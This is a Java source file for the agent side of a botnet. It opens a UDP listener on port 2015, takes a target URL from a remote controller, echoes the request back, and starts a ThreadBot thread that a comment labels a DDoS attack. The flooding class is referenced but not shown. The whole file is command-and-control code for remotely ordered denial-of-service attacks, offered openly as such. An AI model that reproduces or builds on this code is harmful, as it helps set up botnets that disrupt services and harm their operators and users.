import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.SocketException;
import java.net.UnknownHostException;


public class Bot {

	public static void main(String[] args) {
		
		DatagramSocket bot_socket = null;
		boolean var_while = true; // while(true)
		
		try{
				
			bot_socket = new DatagramSocket(2015);
			byte[] bufer = new byte[1000];
			
			while (var_while) {
			
				System.out.println("Waiting for request...");
				// DatagramPacket to recive request
				DatagramPacket request = new DatagramPacket(bufer, bufer.length);

				// Reading request
				bot_socket.receive(request);
				System.out.println("Accepting and replying request.");
				String url = (new String(request.getData()).trim());

				// Resplying request
				DatagramPacket response = new DatagramPacket(request.getData(), request.getLength(), request.getAddress(), request.getPort());
				bot_socket.send(response);		 
				
				// New thread to DDOS attack
				Thread attack = new Thread(new ThreadBot(url));
				attack.start();	
				
			}
			
			// Close socket
			bot_socket.close();
		
		} catch (SocketException Se) {
			System.out.println ("Socket error: " + Se.getMessage());
		} catch (UnknownHostException UHe) {
			System.out.println ("Target IP error: " + UHe.getMessage());
		} catch (IOException IOe) {
			System.out.println ("IO error: " + IOe.getMessage());
		}

	}

}
